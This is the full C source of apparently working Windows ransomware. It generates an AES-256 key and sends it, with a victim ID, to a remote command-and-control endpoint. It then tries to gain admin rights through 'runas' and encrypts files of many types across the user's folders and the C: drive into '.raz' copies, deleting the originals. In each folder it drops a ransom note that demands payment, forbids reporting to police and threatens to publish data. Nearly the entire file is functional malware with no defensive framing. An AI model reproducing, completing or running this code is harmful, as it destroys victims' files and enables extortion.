#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define KEY_SIZE 32  
#define BLOCK_SIZE 16 
#define ID_SIZE 32  
#define ID_FORMATTED_SIZE (ID_SIZE + 7)  
#define FULL_ID_SIZE 39 

// targetted files
const char *fileExtensions[] = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".odt",
    ".ods", ".odp", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff",
    ".svg", ".mp3", ".wav", ".aac", ".flac", ".aiff", ".mp4", ".avi",
    ".mkv", ".mov", ".wmv", ".sql", ".db", ".mdb", ".accdb", ".sqlite",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".exe", ".bat", ".cmd", ".sh",
    ".py", ".java", ".c", ".cpp", ".js", ".html", ".htm", ".css", ".ini",
    ".conf", ".cfg", ".xml", ".json", ".yaml", ".yml", ".pst", ".eml",
    ".msg", ".ost", ".vmdk", ".vhd", ".vdi", ".txt", ".rtf", ".log",
    ".iso", ".ics", ".dat"
};

const char *excludedDirectories[] = {
    "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    "C:\\Windows\\System32\\drivers",
    "C:\\Windows\\System32\\"
};

void secure_memzero(void *ptr, size_t len) {
    volatile char *vptr = (volatile char *)ptr;
    while (len--) {
        *vptr++ = 0;
    }
}

// generate keys etc
void genkeys(BYTE* key, BYTE* iv) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    BYTE keyBlob[KEY_SIZE + sizeof(BLOBHEADER) + sizeof(DWORD)];
    DWORD keyBlobLen = sizeof(keyBlob);
    
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return; 
    }
    
    if (!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return; 
    }
    
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobLen)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return; 
    }
    
    memcpy(key, keyBlob + sizeof(BLOBHEADER) + sizeof(DWORD), KEY_SIZE);
    secure_memzero(keyBlob, sizeof(keyBlob)); 

    if (!CryptGenRandom(hProv, BLOCK_SIZE, iv)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return; 
    }
    
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
}

// personal id
void perid(char* id) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"; //what chars are used to generate the ID, can be expanded.
    srand((unsigned int)time(NULL));

    int index = 0;
    for (int i = 0; i < ID_SIZE; ++i) {
        id[index++] = charset[rand() % (sizeof(charset) - 1)];
        if ((i + 1) % 4 == 0 && index < FULL_ID_SIZE - 1) {
            id[index++] = '-';
        }
    }
    id[FULL_ID_SIZE - 1] = '\0';  
}

void format(BYTE* data, size_t dataSize, char* formattedData, size_t formattedDataSize) {
    for (size_t i = 0; i < dataSize; ++i) {
        snprintf(formattedData + i * 2, formattedDataSize - i * 2, "%02x", data[i]);
    }
    formattedData[dataSize * 2] = '\0';
}

// exfiltrate key, this domain is a proxy that hands the key, iv and ID over to the actual server, which is not hardcoded.
void exfilkey(BYTE* key, BYTE* iv, const char* id) {
    HINTERNET hSession, hConnect, hRequest;
    char keyStr[KEY_SIZE * 2 + 1];
    char ivStr[BLOCK_SIZE * 2 + 1];
    char postData[KEY_SIZE * 2 + BLOCK_SIZE * 2 + FULL_ID_SIZE + 100]; 
    char headers[] = "Content-Type: application/json";

    
    format(key, KEY_SIZE, keyStr, sizeof(keyStr));
    format(iv, BLOCK_SIZE, ivStr, sizeof(ivStr));

    
    snprintf(postData, sizeof(postData),
             "{"
             "\"id\": \"%s\", "
             "\"iv\": \"%s\", "
             "\"key\": \"%s\""
             "}", id, ivStr, keyStr);

    hSession = InternetOpen("TLD13Browser/12.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hConnect = InternetConnect(hSession, "xmb.pythonanywhere.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    hRequest = HttpOpenRequest(hConnect, "POST", "/c2/receiver", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);

    if (HttpSendRequest(hRequest, headers, strlen(headers), postData, strlen(postData))) {
        
    } else {
        
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    secure_memzero(keyStr, sizeof(keyStr));
    secure_memzero(ivStr, sizeof(ivStr));
    secure_memzero(postData, sizeof(postData));
}

void enfile(const char* filePath, BYTE* key, BYTE* iv) {
    HANDLE hFile = CreateFile(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return; 
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (buffer == NULL) {
        CloseHandle(hFile);
        return; 
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        free(buffer);
        CloseHandle(hFile);
        return; 
    }
    CloseHandle(hFile);

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        free(buffer);
        return; 
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    
    if (!CryptHashData(hHash, key, KEY_SIZE, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    DWORD encryptedDataLen = fileSize;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &encryptedDataLen, fileSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    
    BYTE* encryptedData = (BYTE*)malloc(encryptedDataLen);
    if (encryptedData == NULL) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    
    memcpy(encryptedData, buffer, fileSize);
    if (!CryptEncrypt(hKey, 0, TRUE, 0, encryptedData, &fileSize, encryptedDataLen)) {
        free(encryptedData);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }

    char encryptedFilePath[MAX_PATH];
    snprintf(encryptedFilePath, MAX_PATH, "%s.raz", filePath);

    hFile = CreateFile(encryptedFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(encryptedData);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    
    DWORD bytesWritten;
    if (!WriteFile(hFile, encryptedData, encryptedDataLen, &bytesWritten, NULL)) {
        CloseHandle(hFile);
        free(encryptedData);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        free(buffer);
        return; 
    }
    CloseHandle(hFile);

    free(buffer);
    free(encryptedData);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    DeleteFile(filePath);
}

// excluded dirs
BOOL isexcludeddir(const char* path) {
    for (int i = 0; i < sizeof(excludedDirectories) / sizeof(excludedDirectories[0]); ++i) {
        char excludedPath[MAX_PATH];
        snprintf(excludedPath, MAX_PATH, excludedDirectories[i], getenv("USERNAME"));
        
        if (strncmp(path, excludedPath, strlen(excludedPath)) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

// drop the readme.txt
void dropnote(const char* directoryPath, const char* id) {
    if (isexcludeddir(directoryPath)) return;

    char rPath[MAX_PATH];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", directoryPath);

    FILE* readme = fopen(rPath, "w");
    if (readme) {
        fprintf(readme,
            "~~~ Your files have been encrypted! ~~~.\n"
            "Using advanced AES256 encryption technique your databases, documents, photos and other important files have been encrypted.\n"
            "See for yourself! look at any file with .raz extension.\n"
            "You cannot recover these files yourself.\n"
            "Do not waste your time. Nobody can recover your files. Only we can!.\n"
            "We can decrypt these files, we can guarantee that your files can be decrypted, but you have little time.\n"
            "Payment for the decryption is ~$70\n"
            "We can restore your systems in less than 6 hours if you pay now.\n"
            "However, we will not decrypt your system if;\n"
            "   - You go to police and report us.\n"
            ">>> If you report us AFTER decryption, we WILL attack you again!!!<<<\n"
            "Do not delete or modify encrypted files, it will cause problems when recovery!\n"
            "Sent the personal ID to d3cryptme@firemail.cc\n"
            "We will provide payment information, once payment is done, we will sent you a decryptor!\n"
            "If you do not pay, we will publish your data online!\n"
            ">>> Your personal ID: %s <<<\n", id);

        fclose(readme);
    }
}

// process files
void processfiles(const char* rootPath, BYTE* key, BYTE* iv, const char* personalID) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", rootPath);

    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            
            if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                char subDirPath[MAX_PATH];
                snprintf(subDirPath, MAX_PATH, "%s\\%s", rootPath, findFileData.cFileName);

                if (!isexcludeddir(subDirPath)) {
                    processfiles(subDirPath, key, iv, personalID);
                }
            }
        } else {
            const char* fileExt = strrchr(findFileData.cFileName, '.');
            if (fileExt) {
                for (int i = 0; i < sizeof(fileExtensions) / sizeof(fileExtensions[0]); ++i) {
                    if (_stricmp(fileExt, fileExtensions[i]) == 0) {
                        char filePath[MAX_PATH];
                        snprintf(filePath, MAX_PATH, "%s\\%s", rootPath, findFileData.cFileName);
                        enfile(filePath, key, iv);
                        break;
                    }
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    if (!isexcludeddir(rootPath)) {
        dropnote(rootPath, personalID);  
    }

    FindClose(hFind);
}

// target the usual dirs first
void fuckcommon(BYTE* key, BYTE* iv, const char* personalID) {
    char path[MAX_PATH];
    HRESULT result;

    int folders[] = {
        CSIDL_DESKTOPDIRECTORY,
        CSIDL_MYDOCUMENTS,
        CSIDL_MYPICTURES,
        CSIDL_MYMUSIC,
        CSIDL_MYVIDEO,
        CSIDL_PROFILE
    };

    for (int i = 0; i < sizeof(folders) / sizeof(folders[0]); ++i) {
        result = SHGetFolderPath(NULL, folders[i], NULL, SHGFP_TYPE_CURRENT, path);
        if (result == S_OK) {
            processfiles(path, key, iv, personalID);
        }
    }
}

// check admin
BOOL isadmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

// rerun if not given admin
void rerun() {
    if (!isadmin()) {
        CHAR szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, MAX_PATH)) {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;

            if (!ShellExecuteEx(&sei)) {
                exit(1);  
            }
        }
    }
}

// zero out key and iv
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    rerun();

    BYTE key[KEY_SIZE];
    BYTE iv[BLOCK_SIZE];
    char id[FULL_ID_SIZE + 1];  

    genkeys(key, iv);
    perid(id);
    exfilkey(key, iv, id);

    fuckcommon(key, iv, id);

    char drive[] = "C:\\";
    processfiles(drive, key, iv, id);

    secure_memzero(key, KEY_SIZE); 
    secure_memzero(iv, BLOCK_SIZE); 

    return 0;
}
